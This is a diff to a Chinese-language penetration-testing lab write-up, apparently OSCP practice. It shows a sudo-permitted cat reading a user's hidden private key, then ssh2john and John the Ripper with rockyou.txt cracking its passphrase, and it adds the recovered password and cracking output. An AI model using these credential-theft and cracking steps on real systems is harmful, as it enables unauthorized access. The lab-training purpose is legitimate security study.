@@ -94,7 +94,7 @@ sudo -l ///usr/bin/cat /home/isabella/.invisible
 sudo /usr/bin/cat /home/isabella/.invisible
 ```
 
-将私钥复制出来编辑到id_rsa，这登录还需要密码，我们使用 **ssh2john** 将 **id_isa** 秘钥信息 转换 为 **john** 可以识别的hash，然后进行爆破
+将私钥复制出来编辑到id_rsa，这登录还需要密码，我们使用 **ssh2john** 将 **id_isa** 秘钥信息 转换 为 **john** 可以识别的hash，然后进行爆破,得到密码是invisible
 ```C
 ┌──(kali㉿kali)-[~/桌面/OSCP]
 └─$ vim id_rsa
@@ -102,5 +102,8 @@ sudo /usr/bin/cat /home/isabella/.invisible
 └─$ ssh2john id_rsa >> hash  
 ┌──(kali㉿kali)-[~/桌面/OSCP]
 └─$ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+
+0g 0:00:05:24 0.06% (ETA: 2024-04-23 18:54) 0g/s 33.41p/s 33.41c/s 33.41C/s pink69..findingnemo
+invisible        (id_rsa)   
 ```
 
